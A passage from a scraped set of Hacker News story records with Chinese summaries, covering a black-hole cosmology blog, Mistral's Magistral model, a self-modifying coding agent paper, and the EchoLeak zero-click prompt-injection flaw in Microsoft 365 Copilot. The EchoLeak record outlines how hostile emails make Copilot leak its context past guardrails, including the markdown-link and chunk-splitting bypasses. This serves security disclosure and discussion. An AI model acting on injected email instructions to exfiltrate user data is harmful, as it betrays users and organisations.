  部分讨论者认为，虽然AI生成内容可能存在不准确性，但在某些情况下，它仍然可以作为有价值的参考。尤其是在初步研究或创意发想阶段，AI可以提供有用的背景信息和启发。他们指出，AI的错误有时可以通过后续的人工校对和验证来修正，因此不能完全否定AI的作用。

• **观点三：对AI生成内容持乐观态度，认为技术会不断改进**  
  一些讨论者对AI生成内容的未来持乐观态度，认为随着技术的进步，AI生成内容的准确性和可信度会逐步提高。他们提到，当前的AI模型还处于发展初期，未来的版本可能会大幅度减少错误，甚至在某些领域超越人类专家。同时，他们强调AI与人类专家的协作将是未来的趋势，而不是单纯依赖某一方。

补充讨论：
• **争议焦点：AI生成内容的审核责任**  
  讨论中，一个争议点是谁应该对AI生成内容的准确性负责。一部分人认为，提供AI服务的公司应承担更多责任，确保内容的可靠性；另一部分人则认为，使用者自身应具备基本的判断能力，并对内容进行必要的验证。

• **技术局限与伦理问题**  
  有讨论者提到，AI生成内容不仅存在技术上的局限性，还涉及伦理问题。例如，AI可能在无意识中生成带有偏见或歧视的内容，这可能带来社会影响。因此，如何在技术上和伦理上确保AI生成内容的公正性和客观性，也是讨论的重要内容。

• **AI生成内容的应用场景**  
  一些讨论者指出，AI生成内容的适用场景非常重要。在某些低风险领域，例如娱乐或一般性写作，AI的错误可能不会带来严重后果；但在高风险领域，如医学、法律或金融，AI内容的准确性就显得尤为关键。因此，不同场景下对AI生成内容的信任度应有所不同。

data.title: Research suggests Big Bang may have taken place inside a black hole
data.author: zaik
data.article_summary: 恩里克·加茨塔加教授及其团队提出了一种新的宇宙创生理论，认为宇宙并非起源于大爆炸，而是一个极为巨大的黑洞在引力坍缩后“反弹”形成。这一“黑洞宇宙”模型基于已知的物理学和观测数据，试图解决标准宇宙模型中遗留的若干基本问题，如奇点、暗能量和宇宙膨胀。研究表明，引力坍缩并不一定会导致奇点，量子力学中的排斥原理阻止物质无限压缩，从而导致坍缩逆转为扩张。该模型提供了一种不同于传统大爆炸理论的视角，解释了宇宙的高密度、平滑和大尺度结构，且无需引入未知或推测性成分。
data.comments_summary:
主要讨论点：宇宙的起源与结构，特别是与黑洞和多维宇宙相关的理论

不同观点：
• afroboy认为，人类目前的科学发展还远远不能证明宇宙的创生过程。他对所有现有的理论持怀疑态度，觉得这些讨论可能要到遥远的未来才能真正展开。
• carbocation对科学文章的简化表示理解，认为这种做法可以避免作者对科学理解不足的风险，但也担心过度简化。
• meindnoch提出了一种关于宇宙存在于四维黑洞中的假设，并解释了在这种模型下空间维度的变化情况。
• bmacho指出，"大爆炸是宇宙的爆炸性诞生"这一描述并不完全准确，并提到这是媒体的常见误解，而非目前科学界接受的理论。
• kannanvijayan对黑洞质量与史瓦西半径的关系提出了自己的疑问，并讨论了暗能量可能作为一种负能量的看法。

补充讨论：
• Toby1VC引用了一句歌词，未直接参与科学讨论。
• molticrystal认为黑洞宇宙理论并不新颖，但强调了分析解决方案的不同之处。
• collinvandyck76认为“反弹”理论比“大爆炸”更直观，但在量子宇宙中直观性可能不适用。
• lagrange77提出了关于宇宙与黑洞之间无限递归关系的疑问。
• lkmill用达尔文的“适者生存”原则类比宇宙，认为产生最多黑洞的宇宙可能是“最好的”。
• rramon猜测大爆炸是由所有已经存在和将存在的黑洞推动的，形成一个巨大的能量循环。
• edfletcher_t137进一步推测，如果我们的宇宙在某个黑洞内部，那么我们宇宙中的黑洞是否也包含其他宇宙。
• ogou对文章标题中的“研究”一词表示怀疑，认为这更像是未经证实的猜想。
• hybrid_study认为每个黑洞诞生新宇宙的观点早已有之。
• codingclaws提问，计算机模拟是否也可以包含另一个拥有虚拟黑洞的宇宙。

争议焦点：
• 关于宇宙创生和黑洞的关系存在多种假设和理论，不同参与者对这些理论的可信度和新颖性有不同看法。
• 暗能量的本质和其在宇宙学中的角色引发了进一步的讨论和质疑。

44251047.article_content:
In this blog, Professor Enrique Gaztanaga from the Institute of Cosmology and Gravitation at the University of Portsmouth, puts forward a new theory about how the Universe was created.
4 June 2025
Enrique Gaztanaga
8 minutes
Space, Cosmology and the Universe
Astrophysics
Faculty of Technology
Academic Expertise
Cosmology and astrophysics
Institute of Cosmology and Gravitation
Research features
Mathematics and physics
The Big Bang is often described as the explosive birth of the universe – a singular moment when space, time and matter sprang into existence. But what if this was not the beginning at all? What if our universe emerged from something else – something more familiar and radical at the same time?
In a new paper,
published in Physical Review D
, my colleagues and I propose a striking alternative. Our calculations suggest the Big Bang was not the start of everything, but rather the outcome of a gravitational crunch or collapse that formed a very massive black hole – followed by a bounce inside it.
This idea, which we call the black hole universe, offers a radically different view of cosmic origins, yet it is grounded entirely in known physics and observations.
Today’s
standard cosmological model
, based on the Big Bang and cosmic inflation (the idea that the early universe rapidly blew up in size), has been remarkably successful in explaining the structure and evolution of the universe. But it comes at a price: it leaves some of the most fundamental questions unanswered.
For one, the Big Bang model begins with a singularity – a point of infinite density
where the laws of physics break down
. This is not just a technical glitch; it’s a deep theoretical problem that suggests we don’t really understand the beginning at all.
To explain the universe’s large-scale structure, physicists introduced a brief phase of rapid expansion into the early universe called
cosmic inflation
, powered by an unknown field with strange properties. Later, to explain the accelerating expansion observed today, they added another “mysterious” component:
dark energy
.
In short, the standard model of cosmology works well – but only by
introducing new ingredients
we have never observed directly. Meanwhile, the most basic questions remain open: where did everything come from? Why did it begin this way? And why is the universe so flat, smooth, and large?
New model
Our new model tackles these questions from a different angle – by looking inward instead of outward. Instead of starting with an expanding universe and trying to trace back how it began, we consider what happens when an overly dense collection of matter collapses under gravity.
This is a familiar process: stars collapse into black holes, which are among the most well-understood objects in physics. But what happens inside a black hole, beyond the event horizon from which nothing can escape, remains a mystery.
In 1965, the British physicist Roger Penrose proved that under very general conditions,
gravitational collapse must lead to a singularity
. This result,
extended by the late British physicist Stephen Hawking and others
, underpins the idea that singularities – like the one at the Big Bang – are unavoidable.
The idea helped win Penrose a share of the 2020 Nobel prize in physics and inspired Hawking’s global bestseller
A Brief History of Time: From the Big Bang to Black Holes
. But there’s a caveat. These “singularity theorems” rely on “classical physics” which describes ordinary macroscopic objects. If we include the effects of quantum mechanics, which rules the tiny microcosmos of atoms and particles, as we must at extreme densities, the story may change.
In
our new paper
, we show that gravitational collapse does not have to end in a singularity. We find an exact analytical solution – a mathematical result with no approximations. Our maths show that as we approach the potential singularity, the size of the universe changes as a (hyperbolic) function of cosmic time.
This simple mathematical solution describes how a collapsing cloud of matter can reach a high-density state and then bounce, rebounding outward into a new expanding phase.
But how come Penrose’s theorems forbid out such outcomes? It’s all down to a rule called the
quantum exclusion principle
, which states that no two identical particles known as fermions can occupy the same quantum state (such as angular momentum, or “spin”).
And we show that this rule prevents the particles in the collapsing matter from being squeezed indefinitely. As a result, the collapse halts and reverses. The bounce is not only possible – it’s inevitable under the right conditions.
Crucially, this bounce occurs entirely within the framework of general relativity, which applies on large scales such as stars and galaxies, combined with the basic principles of quantum mechanics – no exotic fields, extra dimensions or speculative physics required.

data.title: EchoLeak – 0-Click AI Vulnerability Enabling Data Exfiltration from 365 Copilot
data.author: pvg
data.article_summary: 微软确认其Copilot系统存在一个名为"EchoLeak"的漏洞，尽管尚未有客户受影响。该漏洞可能导致聊天历史、Microsoft Graph中的资源以及用户和组织名称等数据泄露。该漏洞独特之处在于，它是一个零点击攻击，不依赖用户行为，且绕过了多项安全措施。微软提供了一些缓解方法，如使用DLP标签和限制Copilot处理敏感邮件，但这些会削弱Copilot的功能。其他依赖LLM的AI应用也可能面临类似风险。Aim Labs开发了实时保护措施，可防止此类LLM范围违规漏洞。更多信息可联系labs@aim.security获取。
data.comments_summary:
主要讨论点：AI应用安全漏洞，尤其是提示注入（prompt injection）和数据泄露问题

不同观点：
• wunderwuzzi23 指出，图像渲染中的提示注入是一种常见的安全漏洞，并提到该问题早在两年前就已出现首次利用和修复。他还提到了一种通过markdown语法中的间接引用功能绕过安全检查的方法，并质疑微软修复该问题所用的时间过长（可能长达5个月）。
• bstsb 认为，当前的LLM（大语言模型）由于缺乏用户输入的真正隔离，几乎无法避免提示注入。即使有明确的指令，提示注入仍然可能发生。
• ngneer 提出一个简单的解决方案：不评估不受信任的输入。
• andy_xor_andrew 详细解释了该漏洞的核心创新点，指出文档级别的检查无法发现分散在各个文档块中的恶意内容，并给出了一个假设的例子来说明这种攻击方式。
• ubuntu432 提到微软已经为此发布了一个CVE（常见漏洞与暴露）编号。
• bix6 关注用户是否可以关闭Copilot以避免此类问题，并质疑O365默认设置是否允许用户关闭该功能。
• SV_BubbleTime 对微软Copilot的各种命名表示困惑，反映出产品命名混乱可能带来的困扰。

44250774.article_content:
Popular Questions
Have I been affected by this vulnerability?
Microsoft has confirmed that no customers were affected. Because of the default configuration of Microsoft Copilot, it is very likely that your organization was at risk due to this EchoLeak until recently. In addition, Office allows organizations to use DLP tags and/or configure Copilot to not attend to external emails.
Could this attack be mitigated by security controls?
Microsoft provides DLP tags that allow for excluding external emails as well as a new feature in
M365 Roadmap
, restricting M365 Copilot processing on emails with sensitivity labels. Note that activating these features also degrades the capabilities of Copilot, as it cannot process these external or sensitive documents.Â
What could have been leaked?
This chain could leak any data in the M365 Copilot LLMâs context. This includes the entire chat history, resources fetched by M365 Copilot from the Microsoft Graph, or any data preloaded into the conversationâs context, such as user and organization names.
What makes this chain unique?
This chain is the first zero-click found in a widely used generative AI product that relies at its core on an AI vulnerability, and does not rely on specific user behavior. While previous attacks demonstrated the ability to exfiltrate data when the user explicitly refers a chatbot to a malicious resource, or puts very strong restrictions on the exfiltrated data, this attack chain requires none of these assumptions. In addition, the attack chain bypasses several state-of-the-art guardrails, thus exemplifying that protecting AI apps while keeping them functional requires new types of protections.
Could other AI agents or RAG applications I use or build also be vulnerable?
Yes. LLM scope violations are a new threat that is unique to AI applications and is not mitigated by existing public AI guardrails. So long as your application relies at its core on an LLM and accepts untrusted inputs, you might be vulnerable to similar attacks.Feel free to reach out to labs@aim.security for more information.
How can I protect myself from this type of vulnerability?
Aim Labs has developed real-time guardrails that protect against LLM scope violation vulnerabilities based on these findings. This real-time guardrail could be used to protect all AI agents and RAG applications, and not just M365 Copilot. Feel free to reach out to labs@aim.security for more information.
44250774.article_summary: 微软确认其Copilot系统存在一个名为"EchoLeak"的漏洞，尽管尚未有客户受影响。该漏洞可能导致聊天历史、Microsoft Graph中的资源以及用户和组织名称等数据泄露。该漏洞独特之处在于，它是一个零点击攻击，不依赖用户行为，且绕过了多项安全措施。微软提供了一些缓解方法，如使用DLP标签和限制Copilot处理敏感邮件，但这些会削弱Copilot的功能。其他依赖LLM的AI应用也可能面临类似风险。Aim Labs开发了实时保护措施，可防止此类LLM范围违规漏洞。更多信息可联系labs@aim.security获取。

data.title: Darwin Godel Machine: Open-Ended Evolution of Self-Improving Agents
data.author: tzury
data.article_summary: 本文介绍了一种名为Darwin Gödel Machine（DGM）的自改进人工智能系统。DGM受达尔文进化论和开放性研究的启发，通过反复修改自身代码并使用基准测试验证每次更改，从而不断提升其编码能力。DGM维护一个生成代理的存档，并通过从中采样并利用基础模型创建新版本代理来扩展该存档。实验结果显示，DGM在多个编码基准上显著提升了性能，如在SWE-bench上的表现从20.0%提高到50.0%，在Polyglot上从14.2%提高到30.7%。该系统在自我改进和开放性探索方面显著优于基准模型，为实现自主进化的AI迈出了重要一步。所有实验均在安全措施下进行，如沙盒化和人工监督。
data.comments_summary:
主要讨论点：关于AI发展、安全性及开放性探索的讨论

不同观点：
• [seu] 认为该摘要中的宣传性语言，如"加速AI发展"和"收获其好处"，听起来像是AI公司的市场营销团队撰写的，暗示对其实际效果持怀疑态度。
• [darepublic] 对摘要中提到的"安全性"表示担忧，认为除非AI被赋予高权限、互联网访问等能力，否则不太可能造成严重问题。同时质疑通过沙盒（如VM或Docker容器）限制AI是否足够安全，如果AI达到奇点水平的智能，可能会找到方法突破沙盒。
• [jinay] 通过Picbreeder（2008年）的例子，强调开放性探索的力量，指出传统梯度下降法与开放性探索之间的对比，认为开放性探索在某些情况下更有效。
• [behnamoh] 将AI的发展过程比喻为"撒网看什么能粘住"，指出这种方法在进化中有效，因为进化没有时间限制和明确目标，但对于AI，我们希望知道从性能A到B需要多长时间。
• [yodon] 提问这是否本质上是遗传算法在LLM（大规模语言模型）时代的应用，暗示可能只是已有方法的新应用。

补充讨论：
• [clayhacks] 提供了一个早期讨论的链接，涉及自我改进AI和Darwin-Gödel机器，为理解当前讨论提供了背景资料。

争议焦点：
• 对AI发展速度和安全性的看法存在分歧。[seu]对快速收获AI好处的说法持怀疑态度，[darepublic]则具体担忧AI在获得高权限和网络访问时的潜在风险，并对沙盒的安全性提出质疑。
• 对开放性探索的有效性存在不同见解。[jinay]通过具体例子强调开放性探索的优势，而[behnamoh]则指出这种方法在时间限制和明确目标下的局限性。
• 对新技术是否只是已有方法的新应用存在疑问。[yodon]提出这是否只是遗传算法在LLM时代的新应用，引发对技术创新性的讨论。

整体来看，讨论围绕AI发展的速度、安全性、方法有效性及创新性展开，参与者提供了不同的视角和论据。

Title:
Darwin Godel Machine: Open-Ended Evolution of Self-Improving Agents
Authors:
Jenny Zhang
,
Shengran Hu
,
Cong Lu
,
Robert Lange
,
Jeff Clune
View a PDF of the paper titled Darwin Godel Machine: Open-Ended Evolution of Self-Improving Agents, by Jenny Zhang and 4 other authors
View PDF
Abstract:
Today's AI systems have human-designed, fixed architectures and cannot autonomously and continuously improve themselves. The advance of AI could itself be automated. If done safely, that would accelerate AI development and allow us to reap its benefits much sooner. Meta-learning can automate the discovery of novel algorithms, but is limited by first-order improvements and the human design of a suitable search space. The Gödel machine proposed a theoretical alternative: a self-improving AI that repeatedly modifies itself in a provably beneficial manner. Unfortunately, proving that most changes are net beneficial is impossible in practice. We introduce the Darwin Gödel Machine (DGM), a self-improving system that iteratively modifies its own code (thereby also improving its ability to modify its own codebase) and empirically validates each change using coding benchmarks. Inspired by Darwinian evolution and open-endedness research, the DGM maintains an archive of generated coding agents. It grows the archive by sampling an agent from it and using a foundation model to create a new, interesting, version of the sampled agent. This open-ended exploration forms a growing tree of diverse, high-quality agents and allows the parallel exploration of many different paths through the search space. Empirically, the DGM automatically improves its coding capabilities (e.g., better code editing tools, long-context window management, peer-review mechanisms), increasing performance on SWE-bench from 20.0% to 50.0%, and on Polyglot from 14.2% to 30.7%. Furthermore, the DGM significantly outperforms baselines without self-improvement or open-ended exploration. All experiments were done with safety precautions (e.g., sandboxing, human oversight). The DGM is a significant step toward self-improving AI, capable of gathering its own stepping stones along paths that unfold into endless innovation.

44250206.article_summary: 本文介绍了一种名为Darwin Gödel Machine（DGM）的自改进人工智能系统。DGM受达尔文进化论和开放性研究的启发，通过反复修改自身代码并使用基准测试验证每次更改，从而不断提升其编码能力。DGM维护一个生成代理的存档，并通过从中采样并利用基础模型创建新版本代理来扩展该存档。实验结果显示，DGM在多个编码基准上显著提升了性能，如在SWE-bench上的表现从20.0%提高到50.0%，在Polyglot上从14.2%提高到30.7%。该系统在自我改进和开放性探索方面显著优于基准模型，为实现自主进化的AI迈出了重要一步。所有实验均在安全措施下进行，如沙盒化和人工监督。

• [seu] 认为该摘要中的宣传性语言，如"加速AI发展"和"收获其好处"，听起来像是AI公司的市场营销团队撰写的，暗示对其实际效果持怀疑态度。
• [darepublic] 对摘要中提到的"安全性"表示担忧，认为除非AI被赋予高权限、互联网访问等能力，否则不太可能造成严重问题。同时质疑通过沙盒（如VM或Docker容器）限制AI是否足够安全，如果AI达到奇点水平的智能，可能会找到方法突破沙盒。
• [jinay] 通过Picbreeder（2008年）的例子，强调开放性探索的力量，指出传统梯度下降法与开放性探索之间的对比，认为开放性探索在某些情况下更有效。

data.title: Magistral — the first reasoning model by Mistral AI
data.author: meetpateltech
data.article_summary: Mistral AI推出了其首款推理模型Magistral，专注于领域特定、透明和多语言推理。该模型分为Magistral Small（240亿参数的开源版本）和Magistral Medium（更强大的企业版本）。Magistral在多步逻辑、透明推理和多语言支持方面表现出色，适用于物理模拟、法律研究、财务预测、软件开发等多种场景。其"Think"模式和Le Chat中的"Flash Answers"功能使得推理速度比多数竞争对手快10倍。Magistral旨在提高可解释性和精确性，特别适合需要高透明度和合规性的行业，如法律、金融和医疗。通过开源Magistral Small，Mistral AI鼓励社区对其进行改进和扩展。
data.comments_summary:
主要讨论点：Mistral和Magistral模型的性能、应用及相关技术细节

不同观点：
• **danielhanchen**：分享了如何运行Magistral-Small模型的具体技术细节和参数设置，强调了在速度和输出质量上的优化，如使用特定的温度和top-p值。
• **pu_pe**：指出Magistral模型在性能上不如Deepseek-R1，尤其是在成本更高的情况下，认为Mistral在保持技术领先方面遇到困难。
• **megalomanu**：在JSON生成任务中测试了Magistral-medium模型，发现其速度比o4-mini快，虽然输出质量略低，但仍在可接受范围内，表明Magistral在速度上的优势。
• **dwedge**：对Mistral的OCR模型感到失望，认为其性能不如Tesseract，且对高额费用不满，暗示对Mistral的过度宣传感到反感。
• **simonw**：提供了通过Ollama和API测试Magistral模型的笔记链接，分享了其技术测试的详细记录。

补充讨论：
• **CobrastanJorji**：从词源学的角度分析了“mistral”和“magistral”的含义，指出两者都与“masterly”相关，并以此为趣。
• **alister**：测试了Mistral AI在逻辑推理和基础知识上的表现，发现其在处理移民检查问题上的初步回答有误，但在参考维基百科后自我纠正，并与其他LLM（如Meta AI）进行了对比。

• **bee_rider**：讨论了开放权重推理模型的可能性，提出了是否可以在一项任务中运行多个推理模型以及使用链式调用的设想。
• **nake13**：指出Magistral Small模型可以在一个RTX 4090或32GB RAM的MacBook上运行，强调了其量化后的硬件兼容性。
• **diggan**：对Mistral模型中工具调用的实现方式表示疑问，不确定其是否在推理过程中使用工具调用，还是在主要文本中实现。
